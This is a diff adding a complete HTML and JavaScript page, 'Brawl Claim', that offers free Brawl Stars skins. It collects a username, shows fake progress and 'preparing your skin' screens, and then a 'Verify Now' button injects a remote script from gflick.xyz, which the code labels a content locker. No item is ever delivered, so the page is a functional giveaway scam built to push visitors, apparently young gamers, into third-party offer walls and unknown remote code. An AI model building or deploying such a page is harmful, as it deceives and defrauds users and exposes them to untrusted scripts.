@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Brawl Stars Claim</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            position: relative;
+            min-height: 100vh;
+        }
+        body::before {
+            content: "";
+            position: fixed;
+            inset: 0;
+            background: url("https://i0.wp.com/brawlstar.store/wp-content/uploads/2024/09/brawl_stars_stickers-001-1.jpg?fit=1024%2C1024&ssl=1") center/cover no-repeat;
+            opacity: 0.15;
+            z-index: -1;
+        }
+        .progress-wrapper {
+            width: 180px;
+            height: 180px;
+            border-radius: 50%;
+            border: 10px solid #22c55e; 
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #1e293b;
+            color: white;
+            font-size: 2rem;
+            font-weight: bold;
+            box-shadow: 0 0 20px rgba(34,197,94,0.7);
+        }
+        .fade-in {
+            animation: fadeIn 0.5s ease-in-out;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.8); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        .character {
+            transition: all 0.3s ease;
+            border: 3px solid transparent;
+        }
+        .character.selected {
+            border-color: #22c55e;
+            box-shadow: 0 0 20px rgba(34,197,94,0.5);
+            transform: translateY(-5px);
+        }
+        .character img {
+            transition: transform 0.3s ease;
+        }
+        .character:hover img {
+            transform: scale(1.05);
+        }
+        .loading-btn {
+            position: relative;
+            pointer-events: none;
+        }
+        .loading-btn::after {
+            content: "";
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            top: 50%;
+            left: 50%;
+            margin-left: -10px;
+            margin-top: -10px;
+            border: 2px solid #ffffff;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 1s ease-in-out infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .glow-text {
+            text-shadow: 0 0 10px rgba(255,255,255,0.7);
+        }
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.7); }
+            70% { box-shadow: 0 0 0 10px rgba(34, 197, 94, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(34, 197, 94, 0); }
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col items-center justify-start p-4 md:p-6">
+
+    <!-- Header -->
+    <header class="w-full max-w-6xl mb-8">
+        <div class="bg-gradient-to-r from-purple-900/80 to-blue-900/80 backdrop-blur-lg rounded-2xl shadow-2xl p-4 md:p-6 border border-white/10">
+            <div class="flex flex-col md:flex-row justify-between items-center">
+                <div class="flex items-center mb-4 md:mb-0">
+                    <div class="w-12 h-12 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-full flex items-center justify-center mr-3">
+                        <i class="fas fa-gamepad text-white text-xl"></i>
+                    </div>
+                    <h1 class="text-2xl md:text-3xl font-extrabold text-white glow-text">Brawl Claim</h1>
+                </div>
+                <nav class="flex space-x-4 md:space-x-6 text-gray-200 font-semibold">
+                    <a href="#" class="cursor-pointer hover:text-green-400 transition-colors flex items-center">
+                        <i class="fas fa-home mr-2"></i> Home
+                    </a>
+                    <a href="#" class="cursor-pointer hover:text-green-400 transition-colors flex items-center">
+                        <i class="fas fa-tshirt mr-2"></i> Skins
+                    </a>
+                    <a href="#" class="cursor-pointer hover:text-green-400 transition-colors flex items-center">
+                        <i class="fas fa-info-circle mr-2"></i> About
+                    </a>
+                </nav>
+            </div>
+        </div>
+    </header>
+
+    <!-- Search -->
+    <div class="w-full max-w-2xl flex justify-center mb-8">
+        <div class="relative w-full">
+            <input id="searchInput" type="text" placeholder="Search for your favorite skin..." 
+                   class="w-full px-5 py-3 rounded-2xl border border-gray-300 focus:ring-2 focus:ring-green-500 focus:outline-none shadow-lg bg-white/90 backdrop-blur-sm">
+            <i class="fas fa-search absolute right-4 top-3.5 text-gray-400"></i>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <main class="w-full max-w-6xl">
+        <div class="text-center mb-8">
+            <h2 class="text-white text-3xl md:text-4xl font-extrabold mb-2 glow-text">Choose Your Free Skin</h2>
+            <p class="text-gray-300 text-lg">Select one skin from our exclusive collection</p>
+        </div>
+
+        <!-- Character Grid -->
+        <div class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 xl:grid-cols-5 gap-6 p-4" id="characterGrid">
+            <!-- Character cards will be populated here -->
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="w-full max-w-6xl mt-12 text-center text-gray-400 text-sm">
+        <p>This is a fan-made site. Brawl Stars is a registered trademark of Supercell.</p>
+        <p class="mt-2">© 2023 Brawl Claim. All rights reserved.</p>
+    </footer>
+
+    <!-- Loader -->
+    <div id="loaderContainer" class="hidden fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50">
+        <div class="text-center">
+            <div id="loader" class="progress-wrapper pulse">0%</div>
+            <p class="text-white mt-4 text-lg font-semibold">Loading your selection...</p>
+        </div>
+    </div>
+
+    <!-- Claim Modal -->
+    <div id="claimModal" class="hidden fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50">
+        <div class="bg-gradient-to-br from-gray-800 to-gray-900 p-6 rounded-2xl w-11/12 md:w-96 text-center fade-in border border-white/10 shadow-2xl">
+            <div class="flex justify-center mb-4">
+                <div class="w-16 h-16 bg-gradient-to-r from-green-400 to-blue-500 rounded-full flex items-center justify-center">
+                    <i class="fas fa-gift text-white text-2xl"></i>
+                </div>
+            </div>
+            <h2 class="text-xl font-bold mb-2 text-white">You Selected</h2>
+            <ul id="selectedList" class="mb-4 text-green-300 font-semibold space-y-1 text-lg"></ul>
+            <div class="mb-4">
+                <input type="text" id="usernameInput" placeholder="Enter your Brawl Stars username" 
+                       class="border border-gray-600 rounded-lg px-4 py-3 w-full focus:outline-none focus:ring-2 focus:ring-blue-500 bg-gray-700 text-white placeholder-gray-400">
+                <p class="text-gray-400 text-xs mt-2 text-left">Make sure your username is correct to receive the skin</p>
+            </div>
+            <div class="flex space-x-3">
+                <button id="cancelBtn" class="bg-gray-600 hover:bg-gray-700 transition text-white px-4 py-3 rounded-lg font-bold flex-1 flex items-center justify-center">
+                    <i class="fas fa-times mr-2"></i> Cancel
+                </button>
+                <button id="claimBtn" class="bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 transition text-white px-4 py-3 rounded-lg font-bold flex-1 flex items-center justify-center pulse">
+                    <i class="fas fa-check mr-2"></i> Claim
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Final Popup (Verify) -->
+    <div id="verifyPopup" class="hidden fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50">
+        <div class="bg-gradient-to-br from-gray-800 to-gray-900 text-center text-white p-6 rounded-2xl w-11/12 md:w-96 fade-in border border-white/10 shadow-2xl">
+            <div class="flex justify-center mb-4">
+                <div class="w-24 h-24 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-full flex items-center justify-center">
+                    <i class="fas fa-trophy text-white text-3xl"></i>
+                </div>
+            </div>
+            <h2 class="text-orange-400 font-bold text-2xl mb-2">Congratulations!</h2>
+            <p class="text-cyan-300 mb-4">Your skin is ready to be claimed!<br>Complete the verification to receive it.</p>
+            <button id="verifyBtn" class="bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 px-6 py-3 rounded-lg font-bold transition-all flex items-center justify-center mx-auto">
+                <i class="fas fa-shield-alt mr-2"></i> Verify Now
+            </button>
+            <p class="text-gray-400 text-xs mt-4">This helps us prevent abuse and ensure fair distribution</p>
+        </div>
+    </div>
+
+    <!-- Preparation Modal -->
+    <div id="prepModal" class="fixed inset-0 bg-black/80 hidden z-[100] flex items-center justify-center">
+        <div class="bg-gradient-to-br from-gray-800 to-gray-900 text-white rounded-2xl p-6 w-11/12 md:w-80 text-center border border-white/10 shadow-2xl">
+            <div class="mx-auto mb-4 h-14 w-14 border-4 border-white/30 border-t-white rounded-full animate-spin"></div>
+            <h3 class="text-xl font-bold mb-2 text-green-400">Preparing Your Skin</h3>
+            <p class="text-lg font-medium">
+                Setting up your exclusive item<span id="prepDots"></span>
+            </p>
+        </div>
+    </div>
+
+    <script>
+        // Character data array for easier management
+        const characterData = [
+            { name: "Dj Poco", image: "https://i.postimg.cc/5tF50SVb/Poco-Skin-DJ-1.webp", rating: 4.8, rarity: "Epic" },
+            { name: "Plague Doctor Crow", image: "https://i.postimg.cc/3NNVnFHK/images-5.jpg", rating: 4.6, rarity: "Legendary" },
+            { name: "Crowbone", image: "https://i.postimg.cc/TwCBVHBG/Crow-Skin-Crowbone.png", rating: 4.7, rarity: "Mythic" },
+            { name: "Old Hunter Crow", image: "https://i.postimg.cc/HnnRB9CL/images.jpg", rating: 4.9, rarity: "Legendary" },
+            { name: "Aeb", image: "https://i.postimg.cc/ydVwSzQN/images-1.jpg", rating: 4.5, rarity: "Epic" },
+            { name: "Kizu Kenji", image: "https://i.postimg.cc/d1qzTKHQ/images-2.jpg", rating: 4.7, rarity: "Mythic" },
+            { name: "Headless Tickman", image: "https://i.postimg.cc/Y0PVVLps/unnamed.png", rating: 3.9, rarity: "Rare" },
+            { name: "Brawl Pass", image: "https://i.postimg.cc/2yzspfNN/Whats-App-Image-2025-10-03-at-18-42-25-d9153637-removebg-preview.png", rating: 4.8, rarity: "Special" },
+            { name: "Justice Smasher Bibi", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTmJzeoqQs3LuoGlPJa3yzFTe_dEYMzemqqJlUVhToJN54moFT3gtHUJ6-vK8IKuDXB-nA&usqp=CAU", rating: 4.7, rarity: "Epic" },
+            { name: "Thor Bibi", image: "https://i.pinimg.com/736x/61/d7/3a/61d73a27ee6fbbd07b3afe57d5f0e446.jpg", rating: 4.7, rarity: "Mythic" },
+            { name: "Mecha Leon", image: "https://i.postimg.cc/prdSBZ3Z/Screenshot-2025-08-22-200849-removebg-preview.png", rating: 4.7, rarity: "Legendary" },
+            { name: "Mecha Crow", image: "https://i.postimg.cc/HxzK5Kvn/Screenshot-2025-08-22-201021-removebg-preview.png", rating: 4.7, rarity: "Legendary" },
+        ];
+
+        // DOM Elements
+        const characterGrid = document.getElementById("characterGrid");
+        const loaderContainer = document.getElementById("loaderContainer");
+        const loader = document.getElementById("loader");
+        const claimModal = document.getElementById("claimModal");
+        const selectedList = document.getElementById("selectedList");
+        const usernameInput = document.getElementById("usernameInput");
+        const claimBtn = document.getElementById("claimBtn");
+        const cancelBtn = document.getElementById("cancelBtn");
+        const verifyPopup = document.getElementById("verifyPopup");
+        const verifyBtn = document.getElementById("verifyBtn");
+        const searchInput = document.getElementById("searchInput");
+        const prepModal = document.getElementById("prepModal");
+
+        let selectedCharacter = null;
+
+        // Initialize character grid
+        function initializeCharacterGrid() {
+            characterGrid.innerHTML = "";
+            
+            characterData.forEach(character => {
+                const characterCard = document.createElement("div");
+                characterCard.className = "character bg-gradient-to-br from-gray-800 to-gray-900 p-4 rounded-2xl shadow-lg cursor-pointer transform transition-all duration-300 border border-white/10";
+                characterCard.dataset.name = character.name;
+                
+                // Determine rarity color
+                let rarityColor = "text-gray-400";
+                if (character.rarity === "Rare") rarityColor = "text-blue-400";
+                else if (character.rarity === "Epic") rarityColor = "text-purple-400";
+                else if (character.rarity === "Mythic") rarityColor = "text-pink-400";
+                else if (character.rarity === "Legendary") rarityColor = "text-yellow-400";
+                else if (character.rarity === "Special") rarityColor = "text-green-400";
+                
+                characterCard.innerHTML = `
+                    <div class="relative">
+                        <img src="${character.image}" class="w-full h-40 object-contain rounded-lg" alt="${character.name}" loading="lazy">
+                        <div class="absolute top-2 right-2 ${rarityColor} bg-black/70 px-2 py-1 rounded-lg text-xs font-bold">
+                            ${character.rarity}
+                        </div>
+                    </div>
+                    <h2 class="text-lg font-bold mt-3 text-white">${character.name}</h2>
+                    <div class="flex justify-between items-center mt-2">
+                        <p class="text-yellow-500 font-semibold">
+                            <i class="fas fa-star"></i> ${character.rating}/5
+                        </p>
+                        <button class="text-green-400 hover:text-green-300 transition-colors">
+                            <i class="fas fa-plus-circle"></i> Select
+                        </button>
+                    </div>
+                `;
+                
+                characterCard.addEventListener("click", () => selectCharacter(characterCard, character.name));
+                characterGrid.appendChild(characterCard);
+            });
+        }
+
+        // Select character function
+        function selectCharacter(card, name) {
+            // Remove selection from all cards
+            document.querySelectorAll(".character").forEach(c => {
+                c.classList.remove("selected");
+            });
+            
+            // Add selection to clicked card
+            card.classList.add("selected");
+            selectedCharacter = name;
+            
+            // Show loader
+            loaderContainer.classList.remove("hidden");
+            let progress = 0;
+            
+            const interval = setInterval(() => {
+                progress++;
+                loader.textContent = `${progress}%`;
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    loaderContainer.classList.add("hidden");
+                    
+                    // Show claim modal
+                    selectedList.innerHTML = `<li class="flex items-center justify-center"><i class="fas fa-check-circle text-green-400 mr-2"></i> ${selectedCharacter}</li>`;
+                    usernameInput.value = "";
+                    claimModal.classList.remove("hidden");
+                }
+            }, 30);
+        }
+
+        // Search functionality
+        searchInput.addEventListener("input", () => {
+            const term = searchInput.value.toLowerCase();
+            document.querySelectorAll(".character").forEach(card => {
+                const name = card.dataset.name.toLowerCase();
+                card.style.display = name.includes(term) ? "block" : "none";
+            });
+        });
+
+        // Claim button handler
+        claimBtn.addEventListener("click", () => {
+            const username = usernameInput.value.trim();
+            
+            if (!username) {
+                usernameInput.classList.add("border-red-500");
+                usernameInput.placeholder = "Please enter your username";
+                return;
+            }
+            
+            usernameInput.classList.remove("border-red-500");
+            claimModal.classList.add("hidden");
+            showPrepThenVerify();
+        });
+
+        // Cancel button handler
+        cancelBtn.addEventListener("click", () => {
+            claimModal.classList.add("hidden");
+            selectedCharacter = null;
+            document.querySelectorAll(".character").forEach(c => {
+                c.classList.remove("selected");
+            });
+        });
+
+        // Verify button handler
+        verifyBtn.addEventListener("click", () => {
+            verifyBtn.classList.add("loading-btn");
+            verifyBtn.disabled = true;
+            verifyBtn.innerHTML = '<i class="fas fa-spinner mr-2"></i> Verifying...';
+            
+            setTimeout(() => {
+                openLocker();
+            }, 1500);
+        });
+
+        // Updated content locker function
+        function openLocker() {
+            // Updated content locker URL
+            const script = document.createElement("script");
+            script.src = "https://gflick.xyz/cl/i/4oqjgj";
+            script.onload = function() {
+                console.log("Content locker loaded successfully");
+                // The content locker should handle the rest
+            };
+            script.onerror = function() {
+                console.error("Failed to load content locker");
+                alert("Verification failed to load. Please try again.");
+                verifyBtn.classList.remove("loading-btn");
+                verifyBtn.disabled = false;
+                verifyBtn.innerHTML = '<i class="fas fa-shield-alt mr-2"></i> Verify Now';
+            };
+            document.body.appendChild(script);
+        }
+
+        // Preparation modal function
+        function showPrepThenVerify(delayMs = 2200) {
+            prepModal.classList.remove("hidden");
+
+            const dotsEl = document.getElementById("prepDots");
+            let dots = 0;
+            const dotsTimer = setInterval(() => {
+                dots = (dots + 1) % 4;
+                dotsEl.textContent = ".".repeat(dots);
+            }, 400);
+            
+            setTimeout(() => {
+                clearInterval(dotsTimer);
+                prepModal.classList.add("hidden");
+                verifyPopup.classList.remove("hidden");
+            }, delayMs);
+        }
+
+        // Initialize the page
+        initializeCharacterGrid();
+    </script>
+</body>
+</html>
